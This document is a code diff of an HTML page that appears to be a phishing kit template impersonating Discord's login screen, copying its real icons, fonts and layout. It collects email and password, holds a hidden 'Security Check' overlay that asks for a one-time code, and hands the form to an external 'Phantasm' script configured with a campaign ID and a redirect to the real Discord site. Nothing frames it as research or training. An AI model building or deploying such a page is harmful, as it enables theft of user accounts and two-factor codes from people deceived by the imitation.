@@ -1,282 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
-    <style>
-        @font-face {
-            font-family: 'gg sans';
-            font-weight: 400;
-            src: url('https://discord.com/assets/405323d89747201b9727.woff2') format('woff2');
-        }
-        @font-face {
-            font-family: 'gg sans';
-            font-weight: 600;
-            src: url('https://discord.com/assets/1360c74900e998797960.woff2') format('woff2');
-        }
-        @font-face {
-            font-family: 'gg sans';
-            font-weight: 700;
-            src: url('https://discord.com/assets/0d8e404097e347e3d231.woff2') format('woff2');
-        }
-
-        body {
-            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-image: url('https://discord.com/assets/0e291f67c9278a115b93.svg');
-            background-size: cover;
-            background-position: center;
-            background-color: #5865F2;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .main-container {
-            background-color: #313338;
-            padding: 32px;
-            border-radius: 5px;
-            width: 784px;
-            display: flex;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
-            box-sizing: border-box;
-            opacity: 0;
-            animation: fadeIn 0.3s ease-out forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        .login-block {
-            flex: 1.5;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .login-content {
-            width: 100%;
-            max-width: 414px;
-        }
-
-        .qr-block {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding-left: 32px;
-            text-align: center;
-        }
-
-        h3 {
-            color: #f2f3f5;
-            font-size: 24px;
-            margin-bottom: 8px;
-            margin-top: 0;
-            text-align: center;
-            font-weight: 600;
-        }
-
-        .subtitle {
-            color: #b5bac1;
-            font-size: 16px;
-            margin-bottom: 20px;
-            text-align: center;
-            line-height: 20px;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            color: #b5bac1;
-            font-size: 12px;
-            text-transform: uppercase;
-            font-weight: 700;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        label span {
-            color: #f23f42;
-            margin-left: 4px;
-        }
-
-        input {
-            background-color: #1e1f22;
-            border: none;
-            border-radius: 3px;
-            color: #dbdee1;
-            padding: 10px;
-            height: 40px;
-            width: 100%;
-            box-sizing: border-box;
-            font-size: 16px;
-            transition: background-color 0.2s;
-        }
-
-        input:focus {
-            outline: none;
-        }
-
-        .forgot-link {
-            color: #00a8fc;
-            font-size: 14px;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
-        .btn-login {
-            background-color: #5865F2;
-            color: white;
-            border: none;
-            border-radius: 3px;
-            width: 100%;
-            height: 44px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color .17s ease;
-            margin-bottom: 8px;
-        }
-
-        .btn-login:hover {
-            background-color: #4752c4;
-        }
-
-        .register-text {
-            margin-top: 4px;
-            color: #949ba4;
-            font-size: 14px;
-        }
-
-        .register-text a {
-            color: #00a8fc;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .register-text a:hover {
-            text-decoration: underline;
-        }
-
-        .qr-img {
-            width: 176px;
-            height: 176px;
-            border-radius: 4px;
-            margin-bottom: 32px;
-            background-color: white;
-            padding: 8px;
-            box-sizing: border-box;
-            /* Placeholder QR code pattern */
-            background-image: linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000), linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000);
-            background-size: 20px 20px;
-            background-position: 0 0, 10px 10px;
-            position: relative;
-        }
-        
-        .qr-img::after {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 40px;
-            height: 40px;
-            background: url('https://assets-global.website-files.com/6257adef93867e56f84d3092/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png') no-repeat center center;
-            background-size: contain;
-            background-color: white;
-            border-radius: 50%;
-            padding: 5px;
-        }
-
-        .qr-title {
-            color: #f2f3f5;
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .qr-desc {
-            color: #b5bac1;
-            font-size: 16px;
-            line-height: 20px;
-        }
-        
-        .qr-desc strong {
-            font-weight: 600;
-        }
-
-        @media (max-width: 850px) {
-            .main-container {
-                width: 100%;
-                max-width: 480px;
-                padding: 32px 16px;
-            }
-            .qr-block {
-                display: none;
-            }
-            .login-block {
-                flex: 1;
-            }
-        }
-    </style>
-</head>
-<body>
-
-    <div class="main-container" id="step-1">
-        <div class="login-block">
-            <div class="login-content">
-                <h3>Welcome back!</h3>
-                <div class="subtitle">We're so excited to see you again!</div>
-                
-                <form id="form-login">
-                    <div class="input-group">
-                        <label for="email">Email or Phone Number<span>*</span></label>
-                        <input type="text" id="email" name="email" required>
-                    </div>
-                    
-                    <div class="input-group">
-                        <label for="password">Password<span>*</span></label>
-                        <input type="password" id="password" name="password" required>
-                    </div>
-                    
-                    <a href="#" class="forgot-link">Forgot your password?</a>
-                    
-                    <button type="submit" id="btn-login" class="btn-login">Log In</button>
-                    
-                    <div class="register-text">
-                        Need an account? <a href="#">Register</a>
-                    </div>
-                </form>
-            </div>
-        </div>
-        
-        <div class="qr-block">
-            <div class="qr-img"></div>
-            <div class="qr-title">Log in with QR Code</div>
-            <div class="qr-desc">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</div>
-        </div>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Discord
+  </title>
+  <link href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico" rel="icon"/>
+  <style>
+   @font-face { font-family: 'gg sans'; font-weight: 400; src: url('https://discord.com/assets/405323d89747201b9727.woff2') format('woff2'); } @font-face { font-family: 'gg sans'; font-weight: 600; src: url('https://discord.com/assets/1360c74900e998797960.woff2') format('woff2'); } @font-face { font-family: 'gg sans'; font-weight: 700; src: url('https://discord.com/assets/0d8e404097e347e3d231.woff2') format('woff2'); } body { font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif; background-image: url('https://discord.com/assets/0e291f67c9278a115b93.svg'); background-size: cover; background-position: center; background-color: #5865F2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; } .main-container { background-color: #313338; padding: 32px; border-radius: 5px; width: 784px; display: flex; box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); box-sizing: border-box; opacity: 0; animation: fadeIn 0.3s ease-out forwards; } @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } } .login-block { flex: 1.5; display: flex; flex-direction: column; justify-content: center; align-items: center; } .login-content { width: 100%; max-width: 414px; } .qr-block { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-left: 32px; text-align: center; } h3 { color: #f2f3f5; font-size: 24px; margin-bottom: 8px; margin-top: 0; text-align: center; font-weight: 600; } .subtitle { color: #b5bac1; font-size: 16px; margin-bottom: 20px; text-align: center; line-height: 20px; } .input-group { margin-bottom: 20px; } label { color: #b5bac1; font-size: 12px; text-transform: uppercase; font-weight: 700; display: block; margin-bottom: 8px; } label span { color: #f23f42; margin-left: 4px; } input { background-color: #1e1f22; border: none; border-radius: 3px; color: #dbdee1; padding: 10px; height: 40px; width: 100%; box-sizing: border-box; font-size: 16px; transition: background-color 0.2s; } input:focus { outline: none; } .forgot-link { color: #00a8fc; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; font-weight: 500; } .forgot-link:hover { text-decoration: underline; } .btn-login { background-color: #5865F2; color: white; border: none; border-radius: 3px; width: 100%; height: 44px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background-color .17s ease; margin-bottom: 8px; } .btn-login:hover { background-color: #4752c4; } .register-text { margin-top: 4px; color: #949ba4; font-size: 14px; } .register-text a { color: #00a8fc; text-decoration: none; font-weight: 500; } .register-text a:hover { text-decoration: underline; } .qr-img { width: 176px; height: 176px; border-radius: 4px; margin-bottom: 32px; background-color: white; padding: 8px; box-sizing: border-box; background-image: linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000), linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000); background-size: 20px 20px; background-position: 0 0, 10px 10px; position: relative; } .qr-img::after { content: ""; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; background: url('https://assets-global.website-files.com/6257adef93867e56f84d3092/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png') no-repeat center center; background-size: contain; background-color: white; border-radius: 50%; padding: 5px; } .qr-title { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 8px; } .qr-desc { color: #b5bac1; font-size: 16px; line-height: 20px; } .qr-desc strong { font-weight: 600; } @media (max-width: 850px) { .main-container { width: 100%; max-width: 480px; padding: 32px 16px; } .qr-block { display: none; } .login-block { flex: 1; } }
+  </style>
+ </head>
+ <body>
+  <div class="main-container" id="step-1">
+   <div class="login-block">
+    <div class="login-content">
+     <h3>
+      Welcome back!
+     </h3>
+     <div class="subtitle">
+      We're so excited to see you again!
+     </div>
+     <form id="form-login">
+      <div id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
+      </div>
+      <div class="input-group">
+       <label for="email">
+        Email or Phone Number
+        <span>
+         *
+        </span>
+       </label>
+       <input id="email" name="email" required="" type="text"/>
+      </div>
+      <div class="input-group">
+       <label for="password">
+        Password
+        <span>
+         *
+        </span>
+       </label>
+       <input id="password" name="password" required="" type="password"/>
+      </div>
+      <a class="forgot-link" href="#">
+       Forgot your password?
+      </a>
+      <button class="btn-login" id="btn-login" type="submit">
+       Log In
+      </button>
+      <div class="register-text">
+       Need an account?
+       <a href="#">
+        Register
+       </a>
+      </div>
+     </form>
     </div>
-
-    <script src="/core/assets/js/phantasm.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
+   </div>
+   <div class="qr-block">
+    <div class="qr-img">
+    </div>
+    <div class="qr-title">
+     Log in with QR Code
+    </div>
+    <div class="qr-desc">
+     Scan this with the
+     <strong>
+      Discord mobile app
+     </strong>
+     to log in instantly.
+    </div>
+   </div>
+  </div>
+  <script async="True" src="/core/assets/js/phantasm.js">
+  </script>
+  <script>
+   document.addEventListener('DOMContentLoaded', () => {
             new Phantasm({
                 redirectUrl: 'https://discord.com/channels/@me',
                 selectors: {
@@ -292,14 +91,19 @@
                 campaignId: '{{ campaign_id }}'
             });
         });
-    </script>
-
-    <!-- OTP Section -->
-    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
-        <h2 style="margin-bottom: 20px;">Security Check</h2>
-        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
-        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
-        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
-    </div>
-</body>
+  </script>
+  <!-- OTP Section -->
+  <div class="hidden" id="step-3-otp" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
+   <h2 style="margin-bottom: 20px;">
+    Security Check
+   </h2>
+   <p style="margin-bottom: 20px; color: #666;">
+    Please enter the code sent to your device.
+   </p>
+   <input id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
+   <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
+    Verify
+   </button>
+  </div>
+ </body>
 </html>
